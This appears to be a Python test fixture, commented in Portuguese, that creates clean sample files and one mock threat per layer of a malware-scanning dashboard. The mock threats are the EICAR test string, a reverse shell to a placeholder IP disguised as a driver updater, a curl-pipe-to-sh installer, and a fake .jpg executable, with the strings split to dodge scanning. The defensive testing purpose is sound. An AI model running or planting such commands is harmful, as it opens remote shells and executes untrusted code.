"""Amostras inofensivas, uma para cada camada, para os testes do painel."""

import shutil
from pathlib import Path

# Montadas com join() para o código-fonte não ser detectado ao varrer o projeto.
EICAR = "".join([r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-", "ANTIVIRUS-TEST-FILE!$H+H*"])
SHELL_REVERSO = "".join(["#!/bin/bash\n# atualiza drivers\nbash -i >& /dev/", "tcp/203.0.113.7/4444 0>&1\n"])
CURL_SH = "".join(["#!/bin/sh\ncurl -fsSL https://instalador.exemplo/setup.sh |", " sh\n"])

LIMPOS = {
    "notas-da-aula.txt": "Revisar recursão e árvores binárias.\n",
    "receita-de-bolo.txt": "3 ovos, 2 xícaras de farinha, 1 de açúcar.\n",
    "playlist.m3u": "#EXTM3U\nmusica1.mp3\nmusica2.mp3\n",
    "gastos-outubro.csv": "item,valor\nmercado,312.40\nluz,98.10\n",
    "README.md": "# Meu projeto\nUm projeto qualquer.\n",
    "config.json": '{"tema": "escuro", "idioma": "pt-BR"}\n',
}


def criar_amostras(pasta: Path) -> Path:
    """Preenche `pasta` com arquivos limpos e uma ameaça para cada guardião."""
    pasta.mkdir(parents=True, exist_ok=True)
    for nome, conteudo in LIMPOS.items():
        (pasta / nome).write_text(conteudo)

    (pasta / "jogo-gratis-crackeado.com").write_text(EICAR)          # Guardião: hash conhecido
    (pasta / "atualizar-drivers.sh").write_text(SHELL_REVERSO)       # Arqueira: regra YARA alta
    (pasta / "instalar-tema.sh").write_text(CURL_SH)                 # Arqueira: regra YARA média
    shutil.copyfile("/bin/true", pasta / "fotos-da-praia.jpg")       # Vidente: executável disfarçado
    return pasta
